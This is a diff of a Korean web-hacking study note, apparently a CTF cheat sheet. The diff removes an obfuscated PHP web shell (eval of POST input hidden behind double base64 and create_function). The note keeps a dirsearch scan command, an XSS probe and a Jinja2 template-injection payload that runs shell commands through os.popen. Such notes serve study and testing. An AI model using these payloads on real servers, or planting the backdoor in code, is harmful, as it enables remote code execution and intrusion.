@@ -34,33 +34,20 @@ mathjax_autoNumber: true
 # PHP eval()
 * eval()함수는 () 안에 있는 것을 실행시키는 것을 의미한다. 따라서 안에 해커가 exploit할 수 있는 확률이 매우 높다.
 
-UUdWMllXd 29KRjlRVDFOVVd5ZDBaWE4wSjEw cE93P T0=
-@eval($_POST['test']);
-
-<?php 
-$oskl2="UUdWMllXd";
-$gkst3="29KRjlRVDFOVVd5ZDBaWE4wSjEw";
-$hbkw1="cE93P";
-$rcxh1="T0=";
-$strreplace = str_replace("ct7","","str_replace");
-$base64_decode = $strreplace("gd2", "", "base64_decode");
-$create_function = $strreplace("cgs1","","create_function");
-$safm1 = $create_function('', $base64_decode($base64_decode($str_replace("#;*,.", "", $oskl2.$gkst3.$hbkw1.$rcxh1))));
-$safm1();
-?>
-
 ## dirsearch
 * python3 dirsearch -u http://xxx.com:4514
  
 ## XSS 공격
-* url 뒤에 abc.com/<img src=x onerror="alert('xss')"> 을 넣어서 xss 확인을 해볼 수 있다.
+* url 뒤에 ```abc.com/<img src=x onerror="alert('xss')">``` 을 넣어서 xss 확인을 해볼 수 있다.
 
 ## Flask/Jinja 관련 공격
 * 우선 {{3*'6'}}와 같은 방식으로 넣었을 때 숫자로 결과가 나오면 Twig이고 3이 6번 나오면 Jinja2이다. 
 * 아래 코드로 공격을 시도한다. 
+
 ```
 {{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()}}
 ```
+
 * MRO(Method Resolution Order)은 파이썬에 있는 classes의 hierarchy안에 있는 method를 보여주는 역할을 한다. 위에서 __mro__가 그 역할을 하고 첫번째 것을 보겠다는 것이다.
 * \__maro__\[1]은 object 클래스에 관한 것이다.
 * \__subclasses__()\[186]은 class warnings.catch_warnings이다.
